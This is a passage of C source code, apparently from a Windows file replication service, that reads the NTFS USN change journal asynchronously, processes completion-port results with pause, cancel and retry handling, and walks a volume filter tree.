    ReadUsnJournalData.UsnJournalID = pVme->UsnJournalData.UsnJournalID; // Journal ID.

    //
    // This read completes when either the buffer is full or the BytesToWaitFor
    // parameter in the ReadUsnJournalData parameter block is exceeded.
    // The DelayTime in the ReadUsnJournalData parameter block controls how
    // often the NTFS code wakes up and checks the buffer.  It is NOT a timeout
    // on this call.  Setting BytesToWaitFor to sizeof(USN) + 1
    // means that as soon as any data shows up in the journal the call completes.
    // Using this call with async IO lets us monitor a large number of volumes
    // with a few threads.
    //
    // You can't really have multiple read requests outstanding on a single
    // journal since you don't know where the next read will start until the
    // previous read completes.  Even though only one I/O can be outstanding
    // per volume journal it is still possible to have multiple Jbuffs queued
    // for USN processing because the rate of generating new journal entries
    // may exceed the rate at which the data can be processed.
    //

    //
    // Init the buffer Descriptor.
    //
    Jbuff->pVme = pVme;
    Jbuff->Iosb.Information = 0;
    Jbuff->Iosb.Status = 0;
    Jbuff->Overlap.hEvent = NULL;
    Jbuff->JrnlReadPoint = pVme->JrnlReadPoint;
    Jbuff->WStatus = ERROR_IO_PENDING;
    Jbuff->FileHandle = pVme->VolumeHandle;
    //
    // To catch I/O completions with no data.
    //
    ZeroMemory(Jbuff->DataBuffer, sizeof(USN) + sizeof(USN_RECORD));

    InterlockedIncrement(&JournalActiveIoRequests);

    Status = NtFsControlFile(
        Jbuff->FileHandle,          // IN  HANDLE FileHandle,
        NULL,                       // IN  HANDLE Event OPTIONAL,
        NULL,                       // IN  PIO_APC_ROUTINE ApcRoutine OPTIONAL,
        &Jbuff->Overlap,            // IN  PVOID ApcContext OPTIONAL,
        &Jbuff->Iosb,               // OUT PIO_STATUS_BLOCK IoStatusBlock,
        FSCTL_READ_USN_JOURNAL,     // IN  ULONG FsControlCode,
        &ReadUsnJournalData,        // IN  PVOID InputBuffer OPTIONAL,
        sizeof(ReadUsnJournalData), // IN  ULONG InputBufferLength,
        Jbuff->DataBuffer,          // OUT PVOID OutputBuffer OPTIONAL,
        Jbuff->BufferSize );        // IN  ULONG OutputBufferLength

    WStatus = FrsSetLastNTError(Status);
    DPRINT2_WS(4, "ReadUsnJournalData  - NTStatus %08lx, USN = %08x %08x",
               Status, PRINTQUAD(ReadUsnJournalData.StartUsn), WStatus);

    if (!NT_SUCCESS(Status)) {

        //
        // I/O not started so it doesn't complete through the port.
        //
        InterlockedDecrement(&JournalActiveIoRequests);
        DPRINT2_WS(0, "ReadUsnJournalData Failed - NTStatus %08lx, USN = %08x %08x",
                   Status, PRINTQUAD(ReadUsnJournalData.StartUsn), WStatus);
    }

    return Status;
}


BOOL
JrnlGetQueuedCompletionStatus(
    HANDLE CompletionPort,
    LPDWORD lpNumberOfBytesTransferred,
    PULONG_PTR lpCompletionKey,
    LPOVERLAPPED *lpOverlapped
    )

/*++

Routine Description:

    ** NOTE ** Imported version of Win32 function so we can access NTStatus
    return value to seperate out the 32 odd NT to Win32 mappings for
    the ERROR_INVALID_PARAMETER Win32 error code.

    This function waits for pending I/O operations associated with the
    specified completion port to complete.  Server applications may have
    several threads issuing this call on the same completion port.  As
    I/O operations complete, they are queued to this port.  If threads
    are actively waiting in this call, queued requests complete their
    call.

    This API returns a boolean value.

    A value of TRUE means that a pending I/O completed successfully.
    The the number of bytes transfered during the I/O, the completion
    key that indicates which file the I/O occured on, and the overlapped
    structure address used in the original I/O are all returned.

    A value of FALSE indicates one ow two things:

    If *lpOverlapped is NULL, no I/O operation was dequeued.  This
    typically means that an error occured while processing the
    parameters to this call, or that the CompletionPort handle has been
    closed or is otherwise invalid.  GetLastError() may be used to
    further isolate this.

    If *lpOverlapped is non-NULL, an I/O completion packet was dequeud,
    but the I/O operation resulted in an error.  GetLastError() can be
    used to further isolate the I/O error.  The the number of bytes
    transfered during the I/O, the completion key that indicates which
    file the I/O occured on, and the overlapped structure address used
    in the original I/O are all returned.

Arguments:

    CompletionPort - Supplies a handle to a completion port to wait on.

    lpNumberOfBytesTransferred - Returns the number of bytes transfered during the
        I/O operation whose completion is being reported.

    lpCompletionKey - Returns a completion key value specified during
        CreateIoCompletionPort.  This is a per-file key that can be used
        to tall the caller the file that an I/O operation completed on.

    lpOverlapped - Returns the address of the overlapped structure that
        was specified when the I/O was issued.  The following APIs may
        complete using completion ports.  This ONLY occurs if the file
        handle is associated with with a completion port AND an
        overlapped structure was passed to the API.

        LockFileEx
        WriteFile
        ReadFile
        DeviceIoControl
        WaitCommEvent
        ConnectNamedPipe
        TransactNamedPipe

Return Value:

    TRUE - An I/O operation completed successfully.
        lpNumberOfBytesTransferred, lpCompletionKey, and lpOverlapped
        are all valid.

    FALSE - If lpOverlapped is NULL, the operation failed and no I/O
        completion data is retured.  GetLastError() can be used to
        further isolate the cause of the error (bad parameters, invalid
        completion port handle).  Otherwise, a pending I/O operation
        completed, but it completed with an error.  GetLastError() can
        be used to further isolate the I/O error.
        lpNumberOfBytesTransferred, lpCompletionKey, and lpOverlapped
        are all valid.

--*/

{
#undef DEBSUB
#define DEBSUB  "JrnlGetQueuedCompletionStatus:"

    IO_STATUS_BLOCK IoSb;
    NTSTATUS Status;
    LPOVERLAPPED LocalOverlapped;
    BOOL rv;

    Status = NtRemoveIoCompletion(CompletionPort,
                                  (PVOID *)lpCompletionKey,
                                  (PVOID *)&LocalOverlapped,
                                  &IoSb,
                                  NULL);     // Infinite Timeout.

    if ( !NT_SUCCESS(Status) || Status == STATUS_TIMEOUT ) {
        *lpOverlapped = NULL;

        if ( Status == STATUS_TIMEOUT ) {
            SetLastError(WAIT_TIMEOUT);
        } else {
            FrsSetLastNTError(Status);
        }

        rv = FALSE;
        DPRINT_NT(1, "NtRemoveIoCompletion : ", Status);

    } else {

        *lpOverlapped = LocalOverlapped;

        *lpNumberOfBytesTransferred = (DWORD)IoSb.Information;

        if ( !NT_SUCCESS(IoSb.Status) ){
            FrsSetLastNTError( IoSb.Status );
            DPRINT_NT(1, "NtRemoveIoCompletion : ", IoSb.Status);
            rv = FALSE;
        } else {
            rv = TRUE;
        }
    }

    return rv;
}


DWORD
WINAPI
JournalReadThread(
    IN LPVOID Context
    )
/*++

Routine Description:

    This routine processes the I/O completions on the JournalCompletionPort.
    It also handles cancel requests posted to the port when the volume
    reference count goes to zero.  The basic flow is wait on the port,
    check for errors, check for cancel requests and do a cancel, check for
    read success returns.  When data comes back. get the next USN to use,
    queue the buffer to the JournalProcessQueue, get a new buffer off
    the free list and post a new read to the journal handle.

    For canceled requests or requests that complete with an error
    put the Volume Monitor Entry on the VolumeMonitorStopQueue along with
    the error status in the entry.

    This one thread processes all the read requests for all the NTFS volumes
    we monitor.  Once the first read is posted by an external routine we
    pick it up from here.

    TODO: When we run out of free journal buffers, create more (up to a limit).
    Then put code in the processing loop to trim back the freelist.


Arguments:

    Context not used.  The Journal Global state is implied.

Thread Return Value:

    NTSTATUS status


--*/
{

#undef DEBSUB
#define DEBSUB  "JournalReadThread:"

    LPOVERLAPPED                JbuffOverlap;
    DWORD                       IoSize;
    PVOLUME_MONITOR_ENTRY       pVme;
    PJBUFFER                    Jbuff;
    ULONG                       WStatus, WStatus2;
    NTSTATUS                    Status;
    BOOL                        StoppedOne;
    BOOL                        ErrorFlag;
    PLIST_ENTRY                 Entry;
    USN                         NextJrnlReadPoint;
    PCOMMAND_PACKET             CmdPkt;
    BY_HANDLE_FILE_INFORMATION  FileInfo;
    CHAR                        TimeString[TIME_STRING_LENGTH];

    IO_STATUS_BLOCK             Iosb;

    ULONGLONG  VolumeInfoData[(sizeof(FILE_FS_VOLUME_INFORMATION) +
                           MAXIMUM_VOLUME_LABEL_LENGTH + 7)/8];
    PFILE_FS_VOLUME_INFORMATION VolumeInfo =
        (PFILE_FS_VOLUME_INFORMATION)VolumeInfoData;


    //
    // Try-Finally
    //
    try {

    //
    // Capture exception.
    //
    try {

WAIT_FOR_WORK:
    //
    // Look for a Volume Monitor Entry to be placed on the work queue.
    // The agent that put the entry on the queue also started the first
    // read to the journal so we can start looking for I/O completions.
    //
    while (TRUE) {

        WStatus = FrsRtlWaitForQueueFull(&VolumeMonitorQueue, 10000);

        DPRINT1_WS(5, "Wait on VolumeMonitorQueue: Count: %d",
                   VolumeMonitorQueue.Count, WStatus);

        if (WIN_SUCCESS(WStatus)) {
            break;
        }

        switch (WStatus) {

        case WAIT_TIMEOUT:
            if (KillJournalThreads) {
                //
                // Terminate the thread.
                //
                JournalReadThreadHandle = NULL;
                ExitThread(WStatus);
            }
            break;

        case ERROR_INVALID_HANDLE:
            //
            // The VolumeMonitorQueue was rundown.  Exit.
            //
            JournalReadThreadHandle = NULL;
            ExitThread(WStatus);
            break;

        default:

            DPRINT_WS(0, "Unexpected status from FrsRtlWaitForQueueFull", WStatus);
            JournalReadThreadHandle = NULL;
            ExitThread(WStatus);
        }
    }

    //
    // Loop as long as we have volumes to monitor or have I/O outstanding on the port.
    //
    while ((VolumeMonitorQueue.Count != 0) ||
           (JournalActiveIoRequests != 0) ) {

        pVme = NULL;
        JbuffOverlap = NULL;
        WStatus = ERROR_SUCCESS;
        IoSize = 0;

        DPRINT(5, "Waiting on JournalCompletionPort \n");
        ErrorFlag = !JrnlGetQueuedCompletionStatus(JournalCompletionPort,
                                                   &IoSize,
                                                   (PULONG_PTR) &pVme,
                                                   &JbuffOverlap);
                                                   //INFINITE);
        //
        // Check for an error return and see if the completion port has
        // disappeared.
        //
        if (ErrorFlag) {
            WStatus = GetLastError();
            DPRINT_WS(3, "Error from GetQueuedCompletionStatus", WStatus);
            DPRINT5(3, "CompPort: %08x, IoSize: %08x, pVme: %08x, OvLap: %08x, VolHandle: %08x\n",
                   JournalCompletionPort, IoSize, pVme, JbuffOverlap, pVme->VolumeHandle);

            if (WStatus == ERROR_INVALID_HANDLE) {
                JournalCompletionPort = NULL;
                JournalReadThreadHandle = NULL;
                ExitThread(WStatus);
            }

            if (WStatus == ERROR_INVALID_PARAMETER) {
                DPRINT(0, "ERROR- Invalid Param from GetQueuedCompletionStatus\n");
                if (!GetFileInformationByHandle(JournalCompletionPort, &FileInfo)) {
                    WStatus2 = GetLastError();
                    DPRINT_WS(0, "Error from GetFileInformationByHandle", WStatus2);
                } else {
                    CHAR  FlagBuf[120];
                    DPRINT(0, "Info on JournalCompletionPort\n");

                    FrsFlagsToStr(FileInfo.dwFileAttributes, FileAttrFlagNameTable,
                                  sizeof(FlagBuf), FlagBuf);

                    DPRINT2(0, "FileAttributes     %08x Flags [%s]\n",
                            FileInfo.dwFileAttributes, FlagBuf);

                    FileTimeToString(&FileInfo.ftCreationTime, TimeString);
                    DPRINT1(0, "CreationTime       %s\n",    TimeString);

                    FileTimeToString(&FileInfo.ftLastAccessTime, TimeString);
                    DPRINT1(0, "LastAccessTime     %08x\n",  TimeString);

                    FileTimeToString(&FileInfo.ftLastWriteTime, TimeString);
                    DPRINT1(0, "LastWriteTime      %08x\n",  TimeString);

                    DPRINT1(0, "VolumeSerialNumber %08x\n",  FileInfo.dwVolumeSerialNumber);
                    DPRINT1(0, "FileSizeHigh       %08x\n",  FileInfo.nFileSizeHigh);
                    DPRINT1(0, "FileSizeLow        %08x\n",  FileInfo.nFileSizeLow);
                    DPRINT1(0, "NumberOfLinks      %08x\n",  FileInfo.nNumberOfLinks);
                    DPRINT1(0, "FileIndexHigh      %08x\n",  FileInfo.nFileIndexHigh);
                    DPRINT1(0, "FileIndexLow       %08x\n",  FileInfo.nFileIndexLow);
                }

                //
                // See if the volume handle still works.
                //
                DPRINT(0, "Dumping Volume information\n");
                Status = NtQueryVolumeInformationFile(pVme->VolumeHandle,
                                                      &Iosb,
                                                      VolumeInfo,
                                                      sizeof(VolumeInfoData),
                                                      FileFsVolumeInformation);

                if ( NT_SUCCESS(Status) ) {

                    VolumeInfo->VolumeLabel[VolumeInfo->VolumeLabelLength/2] = UNICODE_NULL;
                    FileTimeToString((PFILETIME) &VolumeInfo->VolumeCreationTime, TimeString);

                    DPRINT5(4,"%-16ws (%d), %s, VSN: %08X, VolCreTim: %s\n",
                            VolumeInfo->VolumeLabel,
                            VolumeInfo->VolumeLabelLength,
                            (VolumeInfo->SupportsObjects ? "(obj)" : "(no-obj)"),
                            VolumeInfo->VolumeSerialNumber,
                            TimeString);
                } else {
                    DPRINT_NT(0, "ERROR - Volume root QueryVolumeInformationFile failed.", Status);
                }

                //
                // * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
                // begin workaround for journal bug.
                //
                //
                InterlockedDecrement(&JournalActiveIoRequests);

                if (JbuffOverlap == NULL) {

                    //
                    // No packet dequeued.  Unexpected error Cancel all I/O requests.
                    //
                    DPRINT(0, "Unexpected error from GetQueuedCompletionStatus.  Stopping all journal I/O\n");
                    pVme = NULL;
                    WStatus = E_UNEXPECTED;
                    goto STOP_JOURNAL_IO;
                }

                //
                // Get the base of the Jbuff struct containing this overlap struct.
                //
                Jbuff = CONTAINING_RECORD(JbuffOverlap, JBUFFER, Overlap);
                //DPRINT2(5, "jb:             fc %08x (len: %d)\n", Jbuff, IoSize);

                FrsRtlAcquireQueueLock(&VolumeMonitorQueue);
                pVme->ActiveIoRequests -= 1;
                FRS_ASSERT(pVme->ActiveIoRequests == 0);

                //
                // If I/O on this journal has been stopped or the I/O operation
                // was aborted then free the Jbuff. There should be at most one
                // I/O per volume that comes in with the aborted status.
                //
                // Note:  We can still have other Jbufs queued for processing by the
                //        USN Journal processing thread for this VME.
                //
                if ((!pVme->IoActive) ||
                    (WStatus == ERROR_OPERATION_ABORTED) ) {

                    DPRINT1(5, "I/O aborted, putting jbuffer %08x on JournalFreeQueue.\n", Jbuff);
                    DPRINT2(5, "Canceled Io on volume %ws, IoSize= %d\n",
                            pVme->FSVolInfo.VolumeLabel, IoSize);
                    //
                    // How do we know when all outstanding Jbuffs have
                    // been retired for this VME?  need an interlocked ref count?
                    // Why does this matter?
                    //
                    //DPRINT1(5, "jb: tf %08x (abort)\n", Jbuff);
                    FrsRtlInsertTailQueue(&JournalFreeQueue, &Jbuff->ListEntry);
                    Jbuff = NULL;
                    //
                    // Even if the operation was aborted.  If I/O has not stopped
                    // (e.g. a quick pause-unpause sequence) then start another read.
                    //
                    if (!pVme->IoActive) {
                        FrsRtlReleaseQueueLock(&VolumeMonitorQueue);
                        continue;
                    }
                }

                FrsRtlReleaseQueueLock(&VolumeMonitorQueue);

                DPRINT(0, "Journal request retry\n");
                DPRINT1(0, "Next Usn is: %08x %08x\n", PRINTQUAD(pVme->JrnlReadPoint));

                if (Jbuff != NULL ) {
                    DPRINT1(0, "jb: tf %08x (BUG INVAL PARAM)\n", Jbuff);
                    FrsRtlInsertTailQueue(&JournalFreeQueue, &Jbuff->ListEntry);
                    Jbuff = NULL;
                }

                //
                // Wait and then retry the journal read again.
                //
                Sleep(500);
                FrsRtlAcquireQueueLock(&VolumeMonitorQueue);
                goto START_NEXT_READ;
                //
                // End workaround for journal bug.
                // * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
                //
                //FRS_ASSERT(WStatus != ERROR_INVALID_PARAMETER);
            }

            //
            // Error may be ERROR_OPERATION_ABORTED but shouldn't be success.
            // This gets sorted out below.
            //
            FRS_ASSERT(WStatus != ERROR_SUCCESS);
        }

        //
        // Check if no packet was dequeued from the port.
        //
        if (JbuffOverlap == NULL) {

            //
            // No packet dequeued.  Unexpected error Cancel all I/O requests.
            //
            DPRINT(0, "Unexpected error from GetQueuedCompletionStatus.  Stopping all journal I/O\n");
            pVme = NULL;
            WStatus = E_UNEXPECTED;
            goto STOP_JOURNAL_IO;
        }

        //
        // A packet was dequeued from the port.  First check if this
        // is a request to stop or pause I/O on this journal.
        // There is no Jbuff with this request and the overlap struct
        // is part of the VME.
        //
        if (IoSize == FRS_CANCEL_JOURNAL_READ) {
            pVme->StopIo = FALSE;      // VME Overlap struct available.

            DPRINT1(4, "Cancel Journal Read for %ws\n", pVme->FSVolInfo.VolumeLabel);
            //
            // cancel any outstanding I/O on this volume handle and
            // deactivate the VME.
            //     Note: Any I/O on this volume handle that has already
            //     been completed and queued to the completion port
            //     is not affected by the cancel.  Use !pVme->IoActive to
            //     throw those requests away.
            //

            WStatus = ERROR_SUCCESS;
            goto STOP_JOURNAL_IO;
        } else

        if (IoSize == FRS_PAUSE_JOURNAL_READ) {

            DPRINT2(4, "Pause Journal Read for %ws.  Jrnl State: %s\n",
                   pVme->FSVolInfo.VolumeLabel, RSS_NAME(pVme->JournalState));

            FrsRtlAcquireQueueLock(&VolumeMonitorQueue);
            //
            // This is a pause journal request.  Stop I/O on the journal
            // but don't deactivate the VME.
            //
            pVme->StopIo = FALSE;  // VME Overlap struct available.
            if (pVme->JournalState == JRNL_STATE_PAUSE1) {
                //
                // Cancel I/O on the journal read handle and put a second
                // pause request on the port so we know it was done.
                //
                pVme->IoActive = FALSE;
                if (!CancelIo(pVme->VolumeHandle)) {
                    DPRINT_WS(0, "ERROR - Cancel Io;", GetLastError());
                }

                pVme->WStatus = ERROR_SUCCESS;
                WStatus = JrnlSubmitReadThreadRequest(pVme,
                                                      FRS_PAUSE_JOURNAL_READ,
                                                      JRNL_STATE_PAUSE2);
                DPRINT_WS(0, "Error from JrnlSubmitReadThreadRequest", WStatus);

            } else
            if (pVme->JournalState == JRNL_STATE_PAUSE2) {

                //
                // This is the second pause request so there will be no more
                // journal data buffers on this volume.  (NOT TRUE, sometimes
                // the abort takes awhile but since IoActive is clear the
                // buffer will be ignored.)
                // Send a paused complete command to the journal process queue.
                // When it gets to the head of the queue, all prior queued
                // journal buffers will have been processed so the filter table
                // can now be updated.
                //
                CmdPkt = FrsAllocCommand(&JournalProcessQueue, CMD_JOURNAL_PAUSED);
                CmdPkt->Parameters.JournalRequest.Replica = NULL;
                CmdPkt->Parameters.JournalRequest.pVme = pVme;
                FrsSubmitCommand(CmdPkt, FALSE);

            } else {
                //
                // If we are stopping while in the middle of a Pause request
                // the stop takes precedence.
                //
                if ((pVme->JournalState != JRNL_STATE_STOPPING) &&
                    (pVme->JournalState != JRNL_STATE_STOPPED)) {
                    DPRINT2(0, "ERROR: Invalid Journal State: %s on pause request on volume %ws,\n",
                            RSS_NAME(pVme->JournalState), pVme->FSVolInfo.VolumeLabel);
                }
            }

            FrsRtlReleaseQueueLock(&VolumeMonitorQueue);
            continue;

        }


        //
        // Not a cancel or pause packet.  It must be a journal read response.
        //
        InterlockedDecrement(&JournalActiveIoRequests);

        //
        // Get the base of the Jbuff struct containing this overlap struct.
        //
        Jbuff = CONTAINING_RECORD(JbuffOverlap, JBUFFER, Overlap);
        //DPRINT2(5, "jb:             fc %08x (len: %d)\n", Jbuff, IoSize);

        FrsRtlAcquireQueueLock(&VolumeMonitorQueue);
        pVme->ActiveIoRequests -= 1;
        FRS_ASSERT(pVme->ActiveIoRequests == 0);

        //
        // If I/O on this journal has been stopped or the I/O operation
        // was aborted then free the Jbuff. There should be at most one
        // I/O per volume that comes in with the aborted status.
        //
        // Note:  We can still have other Jbufs queued for processing by the
        //        USN Journal processing thread for this VME.
        //
        if ((!pVme->IoActive) ||
            (IoSize < sizeof(USN)) ||
            (WStatus == ERROR_OPERATION_ABORTED) ) {

            DPRINT1(5, "I/O aborted, putting jbuffer %08x on JournalFreeQueue.\n", Jbuff);
            DPRINT2(5, "Canceled Io on volume %ws, IoSize= %d\n",
                    pVme->FSVolInfo.VolumeLabel, IoSize);
            //
            // How do we know when all outstanding Jbuffs have
            // been retired for this VME?  need an interlocked ref count?
            // Why does it matter?
            //
            //DPRINT1(5, "jb: tf %08x (abort)\n", Jbuff);
            FrsRtlInsertTailQueue(&JournalFreeQueue, &Jbuff->ListEntry);
            //
            // Even if the operation was aborted.  If I/O has not stopped
            // (e.g. a quick pause-unpause sequence) then start another read.
            //
            if (pVme->IoActive) {
                goto START_NEXT_READ;
            }
            FrsRtlReleaseQueueLock(&VolumeMonitorQueue);
            continue;
        }

        FrsRtlReleaseQueueLock(&VolumeMonitorQueue);


        /**************************************************************
        *                                                             *
        *       We have a successfull I/O completion packet.          *
        *       Return the status and data length then put down       *
        *       another read at the Next uSN on the journal.          *
        *                                                             *
        **************************************************************/

        Jbuff->WStatus = WStatus;
        Jbuff->DataLength = IoSize;

        //
        // Update next USN in VME and send the journal buffer out for processing.
        //
        NextJrnlReadPoint = *(USN *)(Jbuff->DataBuffer);
        if (NextJrnlReadPoint < pVme->JrnlReadPoint) {
            DPRINT2(0, "USN error: Next < Previous, Next %08x %08x, Prev: %08x %08x\n",
                        PRINTQUAD(NextJrnlReadPoint), PRINTQUAD(pVme->JrnlReadPoint));
            WStatus = ERROR_INVALID_DATA;
            goto STOP_JOURNAL_IO;
        }

        pVme->JrnlReadPoint = NextJrnlReadPoint;

        DPRINT1(5, "Next Usn is: %08x %08x\n", PRINTQUAD(pVme->JrnlReadPoint));

        //DPRINT2(5, "jb:                         tu %08x (len: %d)\n", Jbuff, Jbuff->DataLength);

        FrsRtlInsertTailQueue(&JournalProcessQueue, &Jbuff->ListEntry);

        //
        // If the read request failed for some reason (e.g. ERROR_NOT_FOUND)
        // let USN processing figure it out and start I/O back up as appropriate.
        //
        if (!WIN_SUCCESS(WStatus)) {
            pVme->IoActive = FALSE;
            continue;
        }

        FrsRtlAcquireQueueLock(&VolumeMonitorQueue);


START_NEXT_READ:
        //
        //  Get a free buffer and start another read on the journal.
        //
        WStatus = JrnlUnPauseVolume(pVme, NULL, TRUE);
        FrsRtlReleaseQueueLock(&VolumeMonitorQueue);

        //
        // Check for abort and cancel all I/O.
        //
        if (WStatus == ERROR_REQUEST_ABORTED) {
            pVme = NULL;
            DPRINT(0, "JournalFreeQueue Abort.  Stopping all journal I/O\n");
            goto STOP_JOURNAL_IO;
        }
        //
        // If the response is success or busy then we can expect to see a
        // buffer come through the port.
        //
        if (!WIN_SUCCESS(WStatus) && (WStatus != ERROR_BUSY)) {
            goto STOP_JOURNAL_IO;
        }

        continue;



STOP_JOURNAL_IO:

        //
        // Test if stopping I/O on just one volume.
        //
        if (pVme != NULL) {
            FrsRtlAcquireQueueLock(&VolumeMonitorQueue);
            //
            // We should send a cmd packet to the journal process queue since
            // that is the point where all pending journal buffers are completed.
            //
            SET_JOURNAL_AND_REPLICA_STATE(pVme, JRNL_STATE_STOPPED);
            if (!CancelIo(pVme->VolumeHandle)) {
                DPRINT_WS(0, "ERROR - Cancel Io;", GetLastError());
            }
            VmeDeactivate(&VolumeMonitorQueue, pVme, WStatus);
            SetEvent(pVme->Event);
            FrsRtlReleaseQueueLock(&VolumeMonitorQueue);
            continue;
        }

        //
        // Stop all I/O on all volume journals.
        //
        StoppedOne = FALSE;

        ForEachListEntry(&VolumeMonitorQueue, VOLUME_MONITOR_ENTRY, ListEntry,
            //
            // The loop iterator pE is of type VOLUME_MONITOR_ENTRY.
            //
            if (pE->JournalState != JRNL_STATE_STOPPED) {
                StoppedOne = TRUE;
                SET_JOURNAL_AND_REPLICA_STATE(pE, JRNL_STATE_STOPPED);
                if (!CancelIo(pE->VolumeHandle)) {
                    DPRINT_WS(0, "ERROR - Cancel Io;", GetLastError());
                }
            }

            VmeDeactivate(&VolumeMonitorQueue, pE, WStatus);
            SetEvent(pE->Event);
        );

        if (!StoppedOne && (JbuffOverlap == NULL)) {
            //
            //  We didn't stop anything and nothing came thru the port.
            //  Must be hung.
            //
            DPRINT(0, "ERROR - Readjournalthread hung.  Killing thread\n");
            JournalReadThreadHandle = NULL;
            ExitThread(WStatus);
        }


    }  // end of while()



    if (KillJournalThreads) {
        //
        // Terminate the thread.
        //
        DPRINT(4, "Readjournalthread Terminating.\n");
        JournalReadThreadHandle = NULL;
        ExitThread(ERROR_SUCCESS);
    }

    goto WAIT_FOR_WORK;


    //
    // Get exception status.
    //
    } except (EXCEPTION_EXECUTE_HANDLER) {
        GET_EXCEPTION_CODE(WStatus);
    }

    } finally {

        if (WIN_SUCCESS(WStatus)) {
            if (AbnormalTermination()) {
                WStatus = ERROR_OPERATION_ABORTED;
            }
        }

        DPRINT_WS(0, "Read Journal Thread finally.", WStatus);

        //
        // Trigger FRS shutdown if we terminated abnormally.
        //
        if (!WIN_SUCCESS(WStatus) && (WStatus != ERROR_PROCESS_ABORTED)) {
            JournalReadThreadHandle = NULL;
            DPRINT(0, "Readjournalthread terminated abnormally, forcing service shutdown.\n");
            FrsIsShuttingDown = TRUE;
            SetEvent(ShutDownEvent);
        }
    }

    return WStatus;
}


ULONG
JrnlGetEndOfJournal(
    IN PVOLUME_MONITOR_ENTRY pVme,
    OUT USN                  *EndOfJournal
    )
/*++

Routine Description:

    Get the address of the end of the USN Journal.  This is used for starting
    a new replica set at the end of the journal.  The replica tree starts out
    empty so there is no need to read through several megabytes of
    USN records.  It is also used to find the end of the journal before
    recovery starts.

Arguments:

    pVme - The Volume Monitor struct to initialize.  It provides the volume
           handle.

    EndOfJournal - Returned USN of the end of the Journal or 0.

Return Value:

    Win32 status.

--*/

{
#undef DEBSUB
#define DEBSUB "JrnlGetEndOfJournal:"

    USN_JOURNAL_DATA UsnJrnlData;

    DWORD           WStatus;
    ULONG           BytesReturned = 0;

    *EndOfJournal = QUADZERO;

    //
    // The following call returns:
    //
    // UsnJournalID     Current Instance of Journal
    // FirstUsn         First position that can be read from journal
    // NextUsn          Next position that will be written to the journal
    // LowestValidUsn   First record that was written into the journal for
    //                  this journal instance.  It is possible that enumerating
    //                  the files on disk will return a USN lower than this
    //                  value.  This indicates that the journal has been
    //                  restamped since the last USN was written for this file.
    //                  It means that the file may have been changed and
    //                  journal data was lost.
    // MaxUsn           The largest change USN the journal will support.
    // MaximumSize
    // AllocationDelta
    //

    if (!DeviceIoControl(pVme->VolumeHandle,
                         FSCTL_QUERY_USN_JOURNAL,
                         NULL, 0,
                         &UsnJrnlData, sizeof(UsnJrnlData),
                         &BytesReturned, NULL)) {

        WStatus = GetLastError();
        DPRINT_WS(0, "Error from FSCTL_QUERY_USN_JOURNAL", WStatus);

        if (WStatus == ERROR_NOT_READY) {
            //
            // Volume is being dismounted.
            //

        } else
        if (WStatus == ERROR_BAD_COMMAND) {
            //
            // NT status was INVALID_DEVICE_STATE.
            //

        } else
        if (WStatus == ERROR_INVALID_PARAMETER) {
            //
            // Bad Handle.
            //

        } else
        if (WStatus == ERROR_JOURNAL_DELETE_IN_PROGRESS) {
            //
            // Journal being deleted.
            //

        } else
        if (WStatus == ERROR_JOURNAL_NOT_ACTIVE) {
            //
            // Journal ???.
            //
        }

        return WStatus;

    }

    if (BytesReturned != sizeof(UsnJrnlData)) {
        //
        // Unexpected result return.
        //
        return ERROR_JOURNAL_NOT_ACTIVE;
    }


    DPRINT1(4, ":S: EOJ from jrnl query   %08x %08x\n", PRINTQUAD(UsnJrnlData.NextUsn));

    //
    // Return the next read point for the journal.
    //
    *EndOfJournal = UsnJrnlData.NextUsn;

    return ERROR_SUCCESS;

}


ULONG
JrnlEnumerateFilterTreeBU(
    PGENERIC_HASH_TABLE Table,
    PFILTER_TABLE_ENTRY FilterEntry,
    PJRNL_FILTER_ENUM_ROUTINE Function,
    PVOID Context
    )
/*++

Routine Description:

    This routine walks through the entries in the Volume filter table connected
    by the child list starting with the FilterEntry provided.  The traversal
    is bottom up.  At each node the function provided is called with the
    entry address and the context pointer.

    It is assumed that the caller has acquired the Filter Table Child list
    lock for the Replica set being traversed.

    Before calling the function with an entry we increment the ref count.
    The Called function must DECREMENT the ref count (or delete the entry).

Arguments:

    Table - The context of the Hash Table to enumerate.
    FilterEntry - The Filter Entry node to start at.
    Function - The function to call for each entry in the subtree.  It is of
               of type PJRNL_FILTER_ENUM_ROUTINE.  Return FALSE to abort the
               enumeration else true.
    Context - A context ptr to pass through to the Function.

Return Value:

    The status code from the argument function.

--*/

{
#undef DEBSUB
#define DEBSUB "JrnlEnumerateFilterTreeBU:"

    PLIST_ENTRY ListHead;
    ULONG WStatus;

    //
    // Check for no entries in tree.
    //
    if (FilterEntry == NULL) {
        return ERROR_SUCCESS;
    }
    INCREMENT_FILTER_REF_COUNT(FilterEntry);
    ListHead = &FilterEntry->ChildHead;

    ForEachSimpleListEntry(ListHead, FILTER_TABLE_ENTRY, ChildEntry,
        //
        // pE is of type PFILTER_TABLE_ENTRY.
        //
        if (!IsListEmpty(&pE->ChildHead)) {
            //
            // Recurse on the child's list head.
            //
            WStatus = JrnlEnumerateFilterTreeBU(Table, pE, Function, Context);
        } else {

            //
            // Apply the function to the node.
            // The function could remove the node from the list but the list macro
            // has captured the Flink so the traversal can continue.
            //
            INCREMENT_FILTER_REF_COUNT(pE);
            WStatus = (Function)(Table, pE, Context);
        }

        if (!WIN_SUCCESS(WStatus)) {
            goto RETURN;
        }
    );

    WStatus = (Function)(Table, FilterEntry, Context);

RETURN:

    return WStatus;
}


ULONG
JrnlEnumerateFilterTreeTD(
    PGENERIC_HASH_TABLE Table,
    PFILTER_TABLE_ENTRY FilterEntry,
    PJRNL_FILTER_ENUM_ROUTINE Function,
    PVOID Context
    )
/*++

Routine Description:

    This routine walks through the entries in the Volume filter table connected
    by the child list starting with the FilterEntry provided.  The traversal
    is Top Down.  At each node the function provided is called with the
    entry address and the context pointer.

    It is assumed that the caller has acquired the Filter Table Child list
    lock for the Replica set being traversed.

    Before calling the function with an entry we increment the ref count.
    The Called function must DECREMENT the ref count (or delete the entry).

Arguments:

    Table - The context of the Hash Table to enumerate.
    FilterEntry - The Filter Entry node to start at.
    Function - The function to call for each entry in the subtree.  It is of
               of type PJRNL_FILTER_ENUM_ROUTINE.  Return FALSE to abort the
               enumeration else true.
    Context - A context ptr to pass through to the Function.

Return Value:

    The status code from the argument function.

--*/

{
#undef DEBSUB
#define DEBSUB "JrnlEnumerateFilterTreeTD:"

    PLIST_ENTRY ListHead;
    ULONG WStatus;
    //
    // Check for no entries in tree.
    //
    if (FilterEntry == NULL) {
